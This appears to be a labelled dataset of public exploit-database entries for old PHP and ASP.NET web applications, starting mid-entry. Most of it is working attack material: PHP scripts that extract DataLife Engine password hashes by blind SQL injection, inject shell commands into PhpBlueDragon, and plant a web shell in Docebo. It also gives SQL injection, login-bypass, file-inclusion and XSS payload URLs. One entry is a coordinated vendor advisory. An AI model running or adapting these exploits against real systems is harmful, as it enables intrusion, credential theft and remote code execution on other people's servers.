3.6.0 (build6) version. Note that builds 4 and 5 also contain the vulnerability present in the ""search[sort_by]"" parameter, but not the other one.  == Report timeline == [2013-07-30] Vulnerability reported to vendor. [2013-07-30] Developers answered back indicating that an update would be released soon. [2013-08-07] PHPFox 3.6.0 (build6) was released, which fixed all of the issues reported. [2013-08-07] Public disclosure.",phpfox,1
7346,"Multiple Membership Script 2.5 - 'id' SQL Injection ================================================   Multiple Membership Script V 2.5 SQL Injection Vulnerability ================================================   ,--^----------,--------,-----,-------^--,   | |||||||||   `--------'     |          O .. Gaza Hacker Team ..   `+---------------------------^----------|     `\_,-------, _________________________|       / XXXXXX /`|     /      / XXXXXX /  `\   /     / XXXXXX /\______(    / XXXXXX /             / XXXXXX /  (________(               `------'  AUTHOR : ViRuS_HaCkErS Email  : h8g@hotmail.com SITE   : gaza-hacker.com  & hacker.ps  ##################################################### ##################################################### ---------  Exploit --------- SQL Injection Vulnerability  http://www.site.com/sitepage.php?id=-15+union+select+1,concat_ws(password,0x3a,username),3,4,5+from+affiliate_admin  sitepage.php?id=-15+union+select+1,concat_ws(password,0x3a,username),3,4,5+from+affiliate_admin http://www.pricelesshost.com/mmsv2/sitepage.php?id=-15+union+select+1,concat_ws(password,0x3a,username),3,4,5+from+affiliate_admin   Login : http://www.site.com/admin  ####################################################################################### Gaza Hacker TeaM : Le0n &  Lito & cLAw & zero cod #######################################################################################  # milw0rm.com [2008-12-05]",.site.,0
12415,"Infocus Real Estate Enterprise Edition Script - Authentication Bypass Authentication bypass in Infocus Real Estate Enterprise Edition script                                    Vendor:www.instantrankingseo.com _______________________Author:Sid3^effects aKa haRi____________________________    Description :  Infocus Real Estate Enterprise Edition, is a complete power packed script with tons of powerful features. You can now have your own Real Estate Script similar to 99acres.com, makaan.com or magicbricks.com. The script is very handy and completely customizable. Below are some of the outstanding features of this script.   ---------------------------------------------------------------------------     * Authentication bypass:      The following script has authentication bypass.      use ' or 1=1 or ''=' in both login and password.    ShoutZ : -------                 ---Indian Cyber warriors--Andhra hackers--   Greetz : --------  ---*L0rd ÇrusAdêr*---d4rk-blu™® [ICW]---R45C4L idi0th4ck3r---CR4C|< 008---M4n0j--MaYuR--",.instantrankingseo.,1
1939,"DataLife Engine 4.1 - SQL Injection (PHP) <?php error_reporting (E_ERROR); ini_set(""max_execution_time"",0);  echo ' +========================================+ | RST/GHC Datalife SQL injection exploit | +========================================+ <    >  Lite Version for DLE <=4.1  <    > ';  if ($argc < 2 ){ print "" Usage: "" . $argv[0] . "" <host> <user> [table prefix]\n""; print "" ex.: "" . $argv[0] . "" datalife.engine.net admin\n""; credits(); exit; }  //DEFINE USER ID $urla = 'http://' . $argv[1] . '/index.php?subaction=userinfo&user=' . $argv[2]; $result = file_get_contents($urla); $str1 = 'user='; #index.php?do=pm&doaction=newpm&user= $position = strpos($result, $str1);  if ($position === false){ print ""\n\rSorry, no match found for user "" . $argv[2]; credits();} $str2 = '"">'; $pos = strpos($result, $str2, $position); $pos1 = $position+5; $user_id = intval(substr($result, $pos1, $pos-$pos1));  print ""Trying to get hash for password of user "". $argv[2] ."" with id="" . $user_id . "":\n"";  //SOME defines (aka CONFIG =)) if (empty($argv[3])){ $prefix = 'dle_';} #define prefix of the tables. try to find it yourself =) it is easy =) else {$prefix = $argv[3];} $min = 48;  # 0 $max = 122; # z if (check("">$min"", 1) == 0 && check(""<$max"", 1) == 0) {print ""\n Site is unvulnerable...""; credits();} for ($sn=1; $sn <= 32; $sn++) {    blind($sn, $min, $max); } credits();   // REQUEST function function check($crcheck, $sn) {    global $argv, $user_id, $prefix; $host   = 'http://' . $argv[1] . '/index.php'; # argv[1] - host $name = $argv[2]; #user name $query  = '?subaction=userinfo&user=' . $name .'%2527%20and%20ascii(substring((SELECT%20password%20FROM%20' . $prefix. 'users%20WHERE%20user_id='. $user_id .'),' . $sn . ',1))' .$crcheck . '/*'; #  $http = $host . $query; #DEBUG #print $http . ""\n"";  $result = file_get_contents($http);    // checking the answer  $string = ': '.$name.'</h2>'; #CORRECT it FOR your version, kids =) #good idea is: 'do=pm&doaction=newpm&user='.$user_id;      if (eregi($string, $result)) { return 1; }   return 0; }  //range function function blind($sn, $fmin, $fmax) {  if (($fmax-$fmin)<5) { if (crack($fmin, $fmax, $sn) == 0){print ""\n\rEXPLOIT FAILED...""; credits();} return;}  $compare = intval($fmin + ($fmax-$fmin)/2);  $crcheck = "">"". $compare;  if ( check($crcheck, $sn) == 1 ) {     blind($sn, $compare, $fmax);     }  else {     blind($sn, $fmin, $compare+1); } }  //brute function function crack($cmin, $cmax, $sn) {  for ($i=$cmin; $i <=$cmax; $i++){    $crcheck = ""=$i"";    if (check($crcheck, $sn) == 1){print chr($i); return 1;}  } return 0; }   function credits(){ print ""\n\n+========================================+\n\r Credits: 1dt.w0lf & foster \n\r Copyright (c) RST/GHC""; print ""\n\r http://rst.void.ru && http://ghc.ru\n\r+========================================+\n""; exit; }  ?>  # milw0rm.com [2006-06-21]",dleviet,1
2402,"PHP Blue Dragon CMS 2.9.1 - Cross-Site Scripting / SQL Injection Code Execution #!/usr/bin/php -q -d short_open_tag=on  <? $devilteam = ""  :::::::::  :::::::::: :::     ::: ::::::::::: :::         :+:    :+: :+:        :+:     :+:     :+:     :+:         +:+    +:+ +:+        +:+     +:+     +:+     +:+         +#+    +:+ +#++:++#   +#+     +:+     +#+     +#+         +#+    +#+ +#+         +#+   +#+      +#+     +#+         #+#    #+# #+#          #+#+#+#       #+#     #+#         #########  ##########     ###     ########### ##########  ::::::::::: ::::::::::     :::     ::::    ::::       :+:     :+:          :+: :+:   +:+:+: :+:+:+      +:+     +:+         +:+   +:+  +:+ +:+:+ +:+      +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+      +#+     +#+        +#+     +#+ +#+       +#+      #+#     #+#        #+#     #+# #+#       #+#      ###     ########## ###     ### ###       ###  	 	 +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + -   - - [DEVIL TEAM THE BEST POLISH TEAM] - - + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + - PhpBlueDragon CMS <= 2.9 (XSS/SQL) Remote Code Execution Exploit + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + - [Script name: PhpBlueDragon CMS v.2.9 - [Script site: http://phpbluedragon.net/ + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + -          Find by: Kacper (a.k.a Rahim) + -    DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam + -          Contact: kacper1964@yahoo.pl -                        or -           http://www.rahim.webd.pl/ + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + - Special Greetz: DragonHeart ;-) - Ema: Leito, Leon, Adam, DeathSpeed, Drzewko, pepi, mivus -                 SkD, nukedclx, Ramzes - - Greetz for all users DEVIL TEAM IRC Channel !! !@ Przyjazni nie da sie zamienic na marne korzysci @! + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + -            Z Dedykacja dla osoby, -         bez ktorej nie mogl bym zyc... -           K.C:* J.M (a.k.a Magaja) + +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""; /* XSS: http://www.site.pl/?m=[XSS]  http://www.site.pl/?m=%3Ctitle%3EDEVIL%20TEAM%20HACK%20YOU%3C/title%3E  and  http://www.site.pl/?m=[SQL]  because public_includes/pub_kernel/pbd_modules.php on line 89-115: .... class ModuleOptions { 	var $ModConfigTable; 	var $NoAccessInfo;  	// Pobierz dane konfiguracyjne pluginu 	function GetModuleConfig($ModuleName) 	{  		global $DBTablePrefix,$DragonDBKernel;  		$sql = ""SELECT * FROM "".$DBTablePrefix.""modules WHERE mod_self_name='{$ModuleName}'"";  		if(!$DragonDBKernel -> query($sql)) 		{ 		EchoWarning(""DE"", ""Can not exec query"",__FILE__,__LINE__,$sql); 		}  			$Result = $DragonDBKernel -> fetch_array(); 			$Rows = $DragonDBKernel -> fetch_num_array();  		if($Rows != 1) 		{ 			// B³±d pobierania informacji o module 			EchoWarning(""PE"", ""Could not get module configuration"",__FILE__,__LINE__,$sql); 		} 		else 		{ ... +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  this works against register_globals=On  */ print $devilteam; if ($argc<4) { echo ""Usage: php "".$argv[0]."" host path cmd options\r\n""; echo ""host:      target server (ip/hostname)\r\n""; echo ""path:      path to PhpCommander\r\n""; echo ""cmd:       a shell command\r\n""; echo ""Options:\r\n""; echo ""   -p[port]:    specify a port other than 80\r\n""; echo ""   -P[ip:port]: specify a proxy\r\n""; echo ""Examples:\r\n""; echo ""php "".$argv[0]."" localhost /lists/ cat ./config/config.php\r\n""; echo ""php "".$argv[0]."" localhost /lists/ ls -la -p81\r\n""; echo ""php "".$argv[0]."" localhost / ls -la -P1.1.1.1:80\r\n""; die; } error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5); function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);      }   }   fclose($ock);   #debug   #echo ""\r\n"".$html; } function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $path=$argv[2]; $cmd=""""; $port=80; $proxy="""";  for ($i=3; $i<=$argc-1; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } } $cmd=urlencode($cmd); if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;} if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}  $evil= ""<?passthru(""$cmd"");?>"" $data='     -----------------------------ZGV2aWx0ZWFt--     Content-Disposition: form-data; name=""login"";     '.$evil.' 	-----------------------------ZGV2aWx0ZWFt--     Content-Disposition: form-data; name=""password"";     weh4cky0u 	-----------------------------ZGV2aWx0ZWFt--     Content-Disposition: form-data; name=""password_recom"";     weh4cky0u 		-----------------------------ZGV2aWx0ZWFt--     Content-Disposition: form-data; name=""email"";     polish@hackers.pl     -----------------------------ZGV2aWx0ZWFt--     Content-Disposition: form-data; name=""send"";          Stwórz moje konto!     -----------------------------ZGV2aWx0ZWFt--     ';     $packet =""POST "".$p.""index.php?m=register HTTP/1.1\r\n"";     $packet.=""User-Agent: Googlebot/2.1\r\n"";     $packet.=""Host: "".$host.""\r\n"";     $packet.=""Accept: text/plain\r\n"";     $packet.=""Content-Type: multipart/form-data; boundary=-----------------------------ZGV2aWx0ZWFt--\r\n"";     $packet.=""Content-Length: "".strlen($data).""\r\n"";     $packet.=$data; 	$packet.=""Connection: Close\r\n"";     show($packet);     sendpacketii($packet); 	echo ""Enter to Evil Bot account"" 	 	 $data2='     -----------------------------ZGV2aWx0ZWF0t--     Content-Disposition: form-data; name=""login"";     '.$evil.' 	-----------------------------ZGV2aWx0ZWF0t--     Content-Disposition: form-data; name=""password"";     weh4cky0u     -----------------------------ZGV2aWx0ZWF0t--     Content-Disposition: form-data; name=""send"";          Zaloguj mnie!     -----------------------------ZGV2aWx0ZWF0t--     '; $packet =""GET "".$p.""index.php?m=login"" HTTP/1.0\r\n""; $packet.=""User-Agent: Googlebot/2.1\r\n""; $packet.=""Host: "".$host.""\r\n"";     $packet.=""Accept: text/plain\r\n"";     $packet.=""Content-Type: multipart/form-data; boundary=-----------------------------ZGV2aWx0ZWF0t--\r\n"";     $packet.=""Content-Length: "".strlen($data2).""\r\n"";     $packet.=$data; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet);  $packet =""GET "".$p.""pbd_engine.php?phpExt=../../../system_logs/log_sys/LOG_LOGIN.log&cmd="".$cmd."" HTTP/1.0\r\n""; $packet.=""User-Agent: Googlebot/2.1\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); if (strstr($html,""56789"")) {  $temp=explode(""56789"",$html);  echo $temp[1];  echo ""\r\nExploit work :D\r\n"";  echo ""\r\nDEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\r\n"";  die; } } ?>  # milw0rm.com [2006-09-20]",PHP,1
5920,"ourvideo CMS 9.5 - Local File Inclusion / Remote File Inclusion / Cross-Site Scripting ??????????????????????????????????????????????????????????????????????????????? ??                             C r a C k E r                                ?? ??          T H E   C R A C K   O F   E T E R N A L   M I G H T             ?? ??????????????????????????????????????????????????????????????????????????????   ?????      From The Ashes and Dust Rises An Unimaginable crack....      ????? ?????????????????????????????????????????????????????????????????????????????? ??       [ Remote File Include ]   [ Local File Include ]     [XSS]         ?? ?????????????????????????????????????????????????????????????????????????????? :   Author   : CraCkEr                : :                                    : ?   Group    : uNiTeD CraCkiNg ForCE  ? ?                                    ? ?   Script   : Ourvideo CMS 9.5       ? ?         Register Globals :         ? ?   Download : SourceForge.net        ? ?                                    ? ?   Method   : GET                    ? ?          [?] ON   [ ] OFF          ? ?   Critical : High [????????]        ? ?                                    ? ?   Impact   : System access          ? ?                                    ? ? ????????????????????????????????????? ???????????????????????????????????? ? ?                              DALnet #crackers                             ?? ?????????????????????????????????????????????????????????????????????????????? :                                                                            : ?  Release Notes:                                                            ? ?  ?????????????                                                             ? ?  Typically used for remotely exploitable vulnerabilities that can lead to  ? ?  system compromise.                                                        ? ?                                                                            ?  ?????????????????????????????????????????????????????????????????????????????? ??                             Exploit URL's                                ?? ??????????????????????????????????????????????????????????????????????????????  [RFI]  http://localhost/path/phpi/edit_top_feature.php?include_connection=[SHELL] http://localhost/path/phpi/edit_topics_feature.php?include_connection=[SHELL]   [LFI]  http://localhost/path/phpi/rss.php?prefix=[LFI]   [XSS]  http://localhost/path/phpi/login.php?top_page=[XSS] http://localhost/path/phpi/login.php?end_page=[XSS]    ??????????????????????????????????????????????????????????????????????????????   Greets:        The_PitBull, Raz0r, iNs, Sad, CwG GeNiuS  ?????????????????????????????????????????????????????????????????????????????? ??                              © CraCkEr 2008                              ?? ??????????????????????????????????????????????????????????????????????????????  # milw0rm.com [2008-06-23]",ourvideo,1
15653,"BugTracker.NET 3.4.4 - Multiple Vulnerabilities       Core Security Technologies - CoreLabs Advisory                   http://corelabs.coresecurity.com/            Multiple vulnerabilities in BugTracker.Net   1. *Advisory Information*  Title: Multiple vulnerabilities in BugTracker.Net Advisory Id: CORE-2010-1109 Advisory URL: [http://www.coresecurity.com/content/multiple-vulnerabilities-in-bugtracker] Date published: 2010-11-30 Date of last update: 2010-11-30 Vendors contacted: BugTracker.NET team Release mode: Coordinated release   2. *Vulnerability Information*  Class: Cross site scripting [CWE-79], SQL injection [CWE-89] Impact: Code execution Remotely Exploitable: Yes Locally Exploitable: No CVE Name: CVE-2010-3266, CVE-2010-3267 Bugtraq ID: N/A   3. *Vulnerability Description*  BugTracker.NET [1][2] is an open-source web-based bug tracker written using ASP.NET, C#, and Microsoft SQL Server. Several cross-site scripting and SQL-injection vulnerabilities were found in the following files of the BugTracker.NET:     . *bugs.aspx*. SQL injection in line 141.    . *delete_query.aspx*. No sanitization for 'row_id.Value' in line 30.    . *edit_bug.aspx*. Variables without sanitization in lines 1846 and 1857.    . *edit_bug.aspx*. No sanitization for variable 'new_project', line 2214.    . *edit_bug.aspx*. XSS in line 2918.    . *edit_comment.aspx*. XSS in line 233.    . *edit_customfield.aspx*. Lines 165 and 172, no sanitization.    . *edit_user_permissions2.aspx*. XSS in line 40.    . *massedit.aspx*. SQL Injection in line 162.   4. *Vulnerable packages*     . BugTracker.NET v3.4.4.    . Older versions are probably affected too, but they were not checked.   5. *Non-vulnerable packages*     . BugTracker.NET v3.4.5.   6. *Credits*  This vulnerability was discovered and researched by Damián Saura [http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=researcher&name=Damian_Saura] and Alejandro Frydman from Core Security Technologies.   7. *Technical Description / Proof of Concept Code*  7.1. *XSS Vulnerabilities*  [CVE-2010-3266 | N/A]. All XSS vulnerabilities can be exploited in similar ways. The following proof of concept shows how to exploit the XSS founded in 'edit_comment.aspx':  /----- ...    230 <div class=align> 231 <table border=0><tr><td> 232 233 <a href=edit_bug.aspx?id=<% Response.Write(Request[""bug_id""]);%>>back to <% Response.Write(btnet.Util.get_setting(""SingularBugLabel"",""bug"")); %></a> 234 <form class=frm runat=""server""> 235 236    <table border=0> ... -----/  First, login to BugTracker and create a comment in a previously created bug. Then, edit it using this URL:  /----- http://localhost:4535/edit_comment.aspx?id=48&bug_id=3%3E%3Cscript%3Ealert%28%27%27%29;%3C/script%3E -----/  As a result, the JavaScript code injected into the parameter 'bug_id' will be rendered without sanitization in the line 233, and executed in the context of the client's web browser.   7.2. *SQL Injection Vulnerabilities*  [CVE-2010-3267 | N/A]. All SQL injection vulnerabilities can also be exploited in similar ways. Consider, for example, the code located in 'delete_query.aspx':  /----- ... 26 if (IsPostBack) 27 { 28     // do delete here 29     sql = @""delete queries where qu_id = $1""; 30     sql = sql.Replace(""$1"", row_id.Value); 31     btnet.DbUtil.execute_nonquery(sql); 32     Server.Transfer (""queries.aspx""); 33 } ... -----/  In line 30, the value of 'row_id' is injected without sanitization into the SQL query. This value arrives to the server in a hidden field of a client request. As a result, a malicious user can manipulate this value in order to execute code in the database layer of the application.   8. *Report Timeline*  . 2010-11-29: Core Security Technologies notifies the BugTracker team of the vulnerability, setting the estimated publication date of the advisory to December 20th 2010.  . 2010-11-29: The BugTracker team asks Core for a technical description of the vulnerability.  . 2010-11-29: Technical details sent to BugTracker team.  . 2010-11-29: The BugTracker team acknowledges the report and notifies they will fix all issues in 1 or 2 working days.  . 2010-11-30: The BugTracker team notifies that a patched version is publicly available at Sourceforge and Codeplex.  . 2010-11-30: The advisory CORE-2010-1109 is published.   9. *References*  [1] BugTracker.NET official website: [http://ifdefined.com/bugtrackernet.html]. [2] BugTracker.NET Source Forge project: [http://sourceforge.net/projects/btnet/].   10. *About CoreLabs*  CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: [http://corelabs.coresecurity.com].   11. *About Core Security Technologies*  Core Security Technologies develops strategic solutions that help security-conscious organizations worldwide develop and maintain a proactive process for securing their networks. The company's flagship product, CORE IMPACT, is the most comprehensive product for performing enterprise security assurance testing. CORE IMPACT evaluates network, endpoint and end-user vulnerabilities and identifies what resources are exposed. It enables organizations to determine if current security investments are detecting and preventing attacks. Core Security Technologies augments its leading technology solution with world-class security consulting services, including penetration testing and software security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core Security Technologies can be reached at 617-399-6980 or on the Web at [http://www.coresecurity.com].   12. *Disclaimer*  The contents of this advisory are copyright (c) 2010 Core Security Technologies and (c) 2010 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: [http://creativecommons.org/licenses/by-nc-sa/3.0/us/]   13. *PGP/GPG Keys*  This advisory has been signed with the GPG key of Core Security Technologies advisories team, which is available for download at [http://www.coresecurity.com/files/attachments/core_security_advisories.asc].",CoreLabs,1
4879,"Docebo 3.5.0.3 - 'lib.regset.php' Command Execution <?  /* 	------------------------------------------------------------------- 	Docebo <= 3.5.0.3 (lib.regset.php) Remote Command Execution Exploit 	------------------------------------------------------------------- 	 	author...: EgiX 	mail.....: n0b0d13s[at]gmail[dot]com 	 	link.....: http://www.docebo.org/ 	details..: works with magic_quotes_gpc = off (if magic quotes affects also $_SERVER[] array)  	[-] autoDetectRegion() function vulnerable to SQL injection in /doceboCore/lib/lib.regset.php  	781.	function autoDetectRegion() { 	782.		 	783.		if(!isset($_SERVER[""HTTP_ACCEPT_LANGUAGE""])) { 	784.			$res=0; 	785.			return $res; 	786.		} 	787.		$accept_language=$_SERVER[""HTTP_ACCEPT_LANGUAGE""]; 	788.		// [TODO] move the code that makes the accept language array to lib.utils 	789. 	790.		$al_arr=explode("","", $accept_language); 	791. 	792.		$i=0; 	793.		$res=""""; 	794.		while(($res == """") && ($i < count($al_arr))) { 	795. 	796.			$bl_arr=explode("";"", $al_arr[$i]); 	797.			$browser_language=$bl_arr[0]; 	798. 	799.			$qtxt=""SELECT region_id FROM "".$this->_getListTable()."" WHERE browsercode LIKE '%"".$browser_language.""%'""; <== 	800.			$q=$this->_executeQuery($qtxt); 	801. 	802.			if (($q) && (mysql_num_rows($q) > 0)) { 	803.				$row=mysql_fetch_array($q); 	804.				$res=$row[""region_id""]; 	805.			}  	an attacker cuold be inject SQL code through http accept-language header (in the query at line 799), but explode() function at 	line 790 will split the injected code by comma ("",""), so isn't possible even a blind SQL injection with BENCHMARK() method... 	this poc will try to inject some php code into docebo web directory by INTO DUMPFILE statement, this requires FILE privilege!  	[-] Path disclosure at: 	 	/doceboCore/class/class.conf_fw.php 	/doceboCore/class.module/class.event_manager.php 	/doceboCore/lib/lib.domxml5.php 	/doceboCore/menu/menu_over.php 	/doceboCms/class/class.conf_cms.php 	/doceboCms/lib/lib.compose.php 	/doceboCms/modules/chat/teleskill.php 	/doceboCms/class/class.admin_menu_cms.php */  error_reporting(0); set_time_limit(0); ini_set(""default_socket_timeout"", 5);  function http_send($host, $packet) { 	$sock = fsockopen($host, 80); 	while (!$sock) 	{ 		print ""\n[-] No response from {$host}:80 Trying again...\n""; 		$sock = fsockopen($host, 80); 	} 	fputs($sock, $packet); 	while (!feof($sock)) $resp .= fread($sock, 1); 	fclose($sock); 	return $resp; }  function get_path() { 	global $host, $path; 	 	$packet = ""GET {$path}../doceboCore/class/class.conf_fw.php HTTP/1.0\r\n""; 	$packet.= ""Host: {$host}\r\n""; 	$packet.= ""Connection: close\r\n\r\n"";  	preg_match(""/in <b>(.*)<\/b> on/i"", http_send($host, $packet), $found); 	$ret = substr($found[1], 0, strlen($found[1]) - strlen(strstr($found[1], ""docebo""))); 	$ret.= substr($path, 1);  	return $ret; }  print ""\n+------------------------------------------------------------+""; print ""\n| Docebo <= 3.5.0.3 Remote Command Execution Exploit by EgiX |""; print ""\n+------------------------------------------------------------+\n"";  if ($argc < 3) { 	print ""\nUsage....: php $argv[0] host path\n""; 	print ""\nhost.....: target server (ip/hostname)""; 	print ""\npath.....: path to docebo directory\n""; 	print ""\nExample..: php $argv[0] localhost /doceboCms/""; 	print ""\nExample..: php $argv[0] localhost /docebo/doceboLms/\n""; 	die(); }  $host = $argv[1]; $path = $argv[2];  $r_path	= str_replace(""\\"", ""/"", get_path()); // replace ""\"" for windows path $r_file = md5(time())."".php"";  print ""\n[-] Path disclosure: {$r_path}\n\n[-] Trying to inject php shell...\n"";  $code	= ""<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>""; $packet = ""GET {$path} HTTP/1.0\r\n""; $packet.= ""Host: {$host}\r\n""; $packet.= ""Accept-Language: %'/**/AND/**/1=0/**/UNION/**/SELECT/**/'{$code}'/**/INTO/**/DUMPFILE/**/'{$r_path}{$r_file}'/*\r\n""; $packet.= ""Connection: close\r\n\r\n""; $html	= http_send($host, $packet);  $packet = ""GET {$path}{$r_file} HTTP/1.0\r\n""; $packet.= ""Host: {$host}\r\n""; $packet.= ""Connection: close\r\n\r\n""; $html	= http_send($host, $packet);  if (!ereg(""_code_"", $html)) die(""\n[-] Exploit failed...\n""); else print ""[-] Shell injected! Starting it...\n"";  define(STDIN, fopen(""php://stdin"", ""r"")); while(1) { 	print ""\nxpl0it-sh3ll > ""; 	$cmd = trim(fgets(STDIN)); 	if ($cmd != ""exit"") 	{ 		$packet  = ""GET {$path}{$r_file} HTTP/1.0\r\n""; 		$packet .= ""Host: {$host}\r\n""; 		$packet .= ""Cmd: "".base64_encode($cmd).""\r\n""; 		$packet .= ""Connection: close\r\n\r\n""; 		$html = http_send($host, $packet); 		if (!ereg(""_code_"", $html)) die(""\n[-] Exploit failed...\n""); 		$shell = explode(""_code_"", $html); 		print ""\n"".$shell[1]; 	} 	else break; }  ?>  # milw0rm.com [2008-01-09]",.docebo.,1
12087,"Joomla! Component Fabrik 2.0 - Local File Inclusion ============================================================================================================     [o] Joomla Component Fabrik Local File Inclusion Vulnerability          Software : com_fabrik version 2.0        Vendor   : http://fabrikar.com/        Author   : AntiSecurity [ NoGe Vrs-hCk OoN_BoY Paman zxvf s4va ]        Contact  : public[dot]antisecurity[dot]org        Home     : http://antisecurity.org/   ============================================================================================================     [o] Exploit         http://localhost/[path]/index.php?option=com_fabrik&controller=[LFI]     [o] PoC         http://localhost/index.php?option=com_fabrik&controller=../../../../../../../../../../etc/passwd%00   ============================================================================================================     [o] Greetz         Angela Zhang stardustmemory aJe martfella pizzyroot Genex        H312Y yooogy mousekill }^-^{ noname matthews s4va wishnusakti        skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke   ============================================================================================================     [o] April 06 2010 - GMT +07:00 Jakarta, Indonesia",Joomla!,1
42940,OpenText Document Sciences xPression 4.5SP1 Patch 13 - 'documentId' SQL Injection Title: OpenText Document Sciences xPression (formerly EMC Document Sciences xPression) - SQL Injection Author: Marcin Woloszyn Date: 27. September 2017 CVE: CVE-2017-14758  Affected Software: ================== OpenText Document Sciences xPression (formerly EMC Document Sciences xPression)  Exploit was tested on: ====================== v4.5SP1 Patch 13 (older versions might be affected as well)  SQL Injection: ==============  Due to lack of prepared statements an application is prone to SQL Injection attacks. Potential attacker can retrieve data from application database by exploiting the issue.  Vector : --------  https://[...]/xAdmin/html/cm_doclist_view_uc.jsp?cat_id=503&documentId=185365177756%20and%201=1&documentType=xDesignPublish&documentName=ContractRealEstate              ^ Results can be retrieved using blind SQL injection method.  Fix: ==== https://knowledge.opentext.com/knowledge/llisapi.dll/Open/68982774  Contact: ======== mw[at]nme[dot]pl,OpenText,1
12398,"Opencourrier 2.03beta - Local File Inclusion / Remote File Inclusion =================================================================== Opencourrier 2.03beta (RFI/LFI) Multiple File Include Vulnerability ===================================================================  [+] Opencourrier 2.03beta (RFI/LFI) Multiple File Include Vulnerability  1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0 0     _                   __           __       __                     1 1   /' \            __  /'__`\        /\ \__  /'__`\                   0 0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1 1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0 0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1 1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0 0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1 1                  \ \____/ >> Exploit database separated by exploit   0 0                   \/___/          type (local, remote, DoS, etc.)    1 1                                                                      1 0  [+] Site            : Inj3ct0r.com                                  0 1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1 0                                                                      0 1                    ######################################            1 0                    I'm cr4wl3r  member from Inj3ct0r Team            1 1                    ######################################            0 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1  [+] Discovered By: cr4wl3r [+] Download: https://adullact.net/frs/download.php/4708/openmairie_courrier2_2.03beta.zip [+] Greetz: All member inj3ct0r.com, manadocoding.net, sekuritionline.net, gcc.web.id  [+] Thanks to: opt!x hacker, xoron, cyberlog, irvian, antihack, angky.tatoki,                 EA ngel, zvtral, s4va, bL4Ck_3n91n3, untouch, team_elite, zreg, mywisdom,                 SENOT, kec0a, d3viln3t, p4p4y, cybertomat, etaxCrew, emen, and all my friend  [+] PoC:  [~] RFI: http://server/[path]/obj/bible.class.php?path_om=[Shell] http://server/[path]/obj/dossier.class.php?pservice.class.phpcategorie.class.php?path_om=[Shell] 